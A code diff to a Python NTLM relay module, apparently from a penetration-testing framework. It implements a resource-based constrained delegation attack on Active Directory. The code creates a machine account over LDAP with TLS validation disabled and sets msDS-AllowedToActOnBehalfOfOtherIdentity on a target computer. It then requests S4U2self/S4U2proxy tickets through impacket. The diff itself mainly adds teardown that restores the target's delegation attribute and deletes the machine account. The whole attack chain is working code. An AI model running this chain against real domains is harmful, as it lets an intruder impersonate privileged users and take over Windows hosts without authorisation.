@@ -767,11 +767,18 @@ class NTLMRelayModule(BaseModule):
                 machine_password=machine_pass,
             )
 
+            conn = None
+            machine_dn = None
+            target_dn = None
+            orig_dacl = None
+            machine_created = False
+            dacl_modified = False
+
             try:
                 from impacket.ldap import ldap as imp_ldap
                 from impacket.ldap import ldapasn1 as ldapasn1_impacket
 
-                # Step 1: Add machine account via LDAP
+                # Step 1: Bind via LDAP
                 import ldap3
                 import ssl
                 tls = ldap3.Tls(validate=ssl.CERT_NONE)
@@ -789,7 +796,33 @@ class NTLMRelayModule(BaseModule):
                 computers_dn = f"CN=Computers,{base_dn}"
                 machine_dn = f"CN={machine_name.rstrip('$')},{computers_dn}"
 
-                # Create machine account
+                # Step 2: Read initial DACL of target computer before modifications
+                conn.search(base_dn,
+                             f"(&(objectClass=computer)(dNSHostName={target_host}))",
+                             attributes=["distinguishedName", "objectSid",
+                                          "msDS-AllowedToActOnBehalfOfOtherIdentity"])
+                if not conn.entries:
+                    result.error = f"Target computer {target_host} not found in AD"
+                    return result
+                target_dn = str(conn.entries[0].distinguishedName)
+                target_entry = conn.entries[0]
+                dacl_attr = None
+                if hasattr(target_entry, "msDS_AllowedToActOnBehalfOfOtherIdentity"):
+                    dacl_attr = target_entry.msDS_AllowedToActOnBehalfOfOtherIdentity
+                elif hasattr(target_entry, "msDS-AllowedToActOnBehalfOfOtherIdentity"):
+                    dacl_attr = getattr(target_entry, "msDS-AllowedToActOnBehalfOfOtherIdentity")
+                elif hasattr(target_entry, "__getitem__"):
+                    try:
+                        dacl_attr = target_entry["msDS-AllowedToActOnBehalfOfOtherIdentity"]
+                    except Exception:
+                        pass
+
+                if dacl_attr and getattr(dacl_attr, "raw_values", None):
+                    orig_dacl = list(dacl_attr.raw_values)
+                else:
+                    orig_dacl = None
+
+                # Step 3: Create machine account
                 attrs = {
                     "objectClass": ["top", "person", "organizationalPerson",
                                      "user", "computer"],
@@ -809,21 +842,10 @@ class NTLMRelayModule(BaseModule):
                         )
                     else:
                         result.error = f"Machine account creation failed: {desc}"
-                    conn.unbind()
                     return result
 
+                machine_created = True
                 logger.info("rbcd_machine_created", machine=machine_name, target=target_host)
-
-                # Step 2: Get target computer's DN
-                conn.search(base_dn,
-                             f"(&(objectClass=computer)(dNSHostName={target_host}))",
-                             attributes=["distinguishedName", "objectSid",
-                                          "msDS-AllowedToActOnBehalfOfOtherIdentity"])
-                if not conn.entries:
-                    result.error = f"Target computer {target_host} not found in AD"
-                    conn.unbind()
-                    return result
-                target_dn = str(conn.entries[0].distinguishedName)
 
                 # Get our machine account's SID
                 conn.search(base_dn,
@@ -831,15 +853,12 @@ class NTLMRelayModule(BaseModule):
                              attributes=["objectSid"])
                 if not conn.entries:
                     result.error = "Created machine account not found"
-                    conn.unbind()
                     return result
                 machine_sid_raw = conn.entries[0].objectSid.raw_values[0]
 
-                # Step 3: Build security descriptor for RBCD
-                # SD format: ACE allowing our machine account S4U2proxy
+                # Step 4: Build security descriptor for RBCD and set delegation
                 sd = self._build_rbcd_sd(machine_sid_raw)
 
-                # Set msDS-AllowedToActOnBehalfOfOtherIdentity
                 conn.modify(target_dn, {
                     "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                         (ldap3.MODIFY_REPLACE, [sd])
@@ -850,14 +869,13 @@ class NTLMRelayModule(BaseModule):
                         f"RBCD delegation set failed: {conn.result.get('description', '')}. "
                         "Likely insufficient privileges on target object."
                     )
-                    conn.unbind()
                     return result
 
+                dacl_modified = True
                 result.delegation_set = True
                 logger.info("rbcd_delegation_set", target=target_host, machine=machine_name)
-                conn.unbind()
 
-                # Step 4: S4U2self + S4U2proxy via impacket
+                # Step 5: S4U2self + S4U2proxy via impacket
                 ticket_path = self._s4u_attack(
                     dc=dc, domain=domain,
                     machine_name=machine_name, machine_pass=machine_pass,
@@ -874,6 +892,38 @@ class NTLMRelayModule(BaseModule):
                 result.error = f"Required library missing: {exc}"
             except Exception as exc:
                 result.error = str(exc)[:300]
+            finally:
+                # Guaranteed Teardown (Rule 4 / MOD-012): Restore DACL and delete machine account
+                if conn and getattr(conn, "bound", False):
+                    if dacl_modified and target_dn:
+                        try:
+                            if orig_dacl:
+                                conn.modify(target_dn, {
+                                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
+                                        (ldap3.MODIFY_REPLACE, orig_dacl)
+                                    ],
+                                })
+                            else:
+                                conn.modify(target_dn, {
+                                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
+                                        (ldap3.MODIFY_DELETE, [])
+                                    ],
+                                })
+                            logger.info("rbcd_dacl_restored", target=target_host)
+                        except Exception as dacl_err:
+                            logger.error("rbcd_dacl_restore_failed", target=target_host, error=str(dacl_err))
+
+                    if machine_created and machine_dn:
+                        try:
+                            conn.delete(machine_dn)
+                            logger.info("rbcd_machine_deleted", machine=machine_dn)
+                        except Exception as del_err:
+                            logger.error("rbcd_machine_delete_failed", machine=machine_dn, error=str(del_err))
+
+                    try:
+                        conn.unbind()
+                    except Exception:
+                        pass
 
             return result
 
